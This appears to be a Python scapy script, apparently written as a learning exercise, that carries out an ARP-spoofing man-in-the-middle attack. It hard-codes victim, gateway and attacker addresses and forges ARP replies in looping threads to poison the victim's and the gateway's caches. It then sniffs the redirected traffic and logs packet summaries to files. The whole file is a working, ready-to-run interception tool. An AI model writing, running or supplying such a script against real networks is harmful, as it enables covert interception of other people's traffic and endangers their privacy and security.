# main.py
from scapy.all import *
import threading



default_gateway_ip = "192.168.1.254"
gateway_mac = "F8:22:29:26:79:70"

victim_mac = "58:a8:e8:2c:3d:39"
victim_ip = "192.168.1.120"

attacker_ip = "192.168.1.96"
attacker_mac = "3C:55:76:DE:12:EF"



def poison_victim(victim_ip: str, victim_mac: str, default_gateway_ip: str, attacker_mac: str):
    sendp(Ether(dst=victim_mac) / # build ethernet frame with destination of the victim (the frame also includes the source MAC address by default)
      ARP(op="is-at", # op is-at means this is a reply so an assertion
          psrc=default_gateway_ip, # the protocol source IP we claim "is-at" the source MAC address
          pdst=victim_ip, # protocol destination address, the IP we are talking to
          hwdst=victim_mac, # hardware MAC destination, the hardware MAC address this ARP packet is intended for at the destination
          hwsrc=attacker_mac), # The hardware MAC address source, the MAC address we claim is-at the IP address this is defined by default and doesnt need to be metnioned explicitly
          inter=0.2, loop=1)


def poison_gateway(gateway_ip: str, gateway_mac: str, victim_ip: str, attacker_mac: str):
    sendp(Ether(dst=gateway_mac) / 
      ARP(op="is-at",
          psrc=victim_ip,
          pdst=gateway_ip,
          hwdst=gateway_mac,
          hwsrc=attacker_mac),
          inter=0.2, loop=1)


def sniff_victim_requests(victim_mac: str, attacker_mac: str, gateway_ip: str):
    iface = conf.iface # get the interface to use for sending/sniffing this gets the default interface which is the name of your ethernet entry point or network card for wireless wifi conf.iface is the default if ommitted
    bpf = f"ether dst {attacker_mac} and ether src {victim_mac} and ip dst {gateway_ip}" # a Berkely Packet Filter is applied to only sniff specific packets that meet those requirements

    def write_packet_to_victim_requests_file(packet):
        with open("victim_requests.txt", "a") as file:
            file.write(f"{packet.summary()}\n")
        return packet.summary()

    sniff(iface=iface, filter=bpf, prn=write_packet_to_victim_requests_file) # print result function calls a function everytime a packet is sniffed


def sniff_gateway_responses(gateway_ip: str, attacker_mac: str, victim_ip: str):
    iface = conf.iface
    bpf = f"ether dst {attacker_mac} and src host {gateway_ip} and ip dst {victim_ip}"

    def write_packet_to_gateway_responses_file(packet):
        with open("gateway_responses.txt", "a") as file:
            file.write(f"{packet.summary()}\n")
        return packet.summary()

    sniff(iface=iface, filter=bpf, prn=write_packet_to_gateway_responses_file)



victim_poisoning = threading.Thread(target=poison_victim, args=(victim_ip, victim_mac, default_gateway_ip, attacker_mac))
gateway_poisoning = threading.Thread(target=poison_gateway, args=(default_gateway_ip, gateway_mac, victim_ip, attacker_mac))
victim_request_sniffing = threading.Thread(target=sniff_victim_requests, args=(victim_mac, attacker_mac, default_gateway_ip))
gateway_response_sniffing = threading.Thread(target=sniff_gateway_responses, args=(default_gateway_ip, attacker_mac, victim_ip))


victim_poisoning.start()
gateway_poisoning.start()
victim_request_sniffing.start()
gateway_response_sniffing.start()